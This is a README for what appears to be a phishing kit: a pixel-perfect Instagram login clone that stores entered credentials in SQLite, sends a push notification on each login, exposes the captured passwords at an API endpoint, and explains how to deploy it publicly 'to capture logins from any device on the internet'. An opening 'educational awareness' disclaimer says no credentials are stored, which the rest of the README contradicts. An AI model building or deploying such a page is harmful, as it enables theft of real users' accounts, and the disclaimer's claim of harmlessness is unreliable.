# Instagram Login Awareness Demo

> ⚠️ **Educational Purpose Only**

This project is created only for cybersecurity awareness and education.

It demonstrates how phishing pages can look like legitimate Instagram login pages so users can learn to identify and avoid scams.

## ⚠️ Warning

- This project is for educational and security awareness purposes only.
- Do NOT use this project to collect usernames or passwords.
- Do NOT use this project for phishing, fraud, or any illegal activity.
- No credentials should be stored or transmitted.
- The author is not responsible for any misuse of this project.

## Disclaimer

This project is not affiliated with, endorsed by, or sponsored by Instagram or Meta. All trademarks belong to their respective owners.
# Instagram Login Tracker

A pixel-perfect Instagram login page clone that:
- Captures login credentials into a local SQLite database
- Sends a **real-time push notification to your phone** every time someone logs in
- Fully mobile-responsive, looks identical to the real Instagram login screen

---

## 📲 Phone Notification Setup (FREE — takes 2 minutes)

1. Install the **ntfy** app on your phone
   - Android: [Google Play](https://play.google.com/store/apps/details?id=io.heckel.ntfy)
   - iOS: [App Store](https://apps.apple.com/app/ntfy/id1625396347)

2. Open the app → tap **"+" (Subscribe to topic)**

3. Enter your topic name (must match what's in your `.env` file)
   - Default topic: `my-logins-change-this-secret-topic-2024`
   - **Change this to something unique and secret!**

4. Done! You'll get a notification every login attempt.

---

## 🚀 Quick Start

### 1. Install dependencies
```bash
npm install
```

### 2. Configure environment
```bash
cp .env.example .env
```
Edit `.env` and set your unique `NTFY_TOPIC` name.

### 3. Start the server
```bash
npm start
```

Open your browser at: **http://localhost:3000**

---

## 📋 View Saved Logins

Visit `http://localhost:3000/api/logs` to see all captured credentials in JSON format.

Or query the SQLite database directly:
```bash
sqlite3 logins.db "SELECT * FROM login_attempts;"
```

---

## 📁 Project Structure

```
instagram-login/
├── server.js            ← Express backend (API + notifications)
├── package.json
├── .env.example         ← Copy to .env and configure
├── logins.db            ← Auto-created SQLite database
└── public/
    ├── index.html       ← Instagram login UI
    ├── instagram-logo.png
    └── meta-logo.png
```

---

## ⚙️ Environment Variables

| Variable | Description | Default |
|----------|-------------|---------|
| `PORT` | Server port | `3000` |
| `NTFY_TOPIC` | Your unique push notification topic | `my-logins-...` |
| `NTFY_SERVER` | ntfy server URL | `https://ntfy.sh` |
| `DB_PATH` | SQLite database file path | `./logins.db` |

---

## 🌐 Deploy Online (optional)

To capture logins from any device on the internet, deploy to:
- **Railway**: `railway up`
- **Render**: Connect your GitHub repo
- **Heroku**: `heroku create && git push heroku main`

Make sure to set your environment variables on the hosting platform.
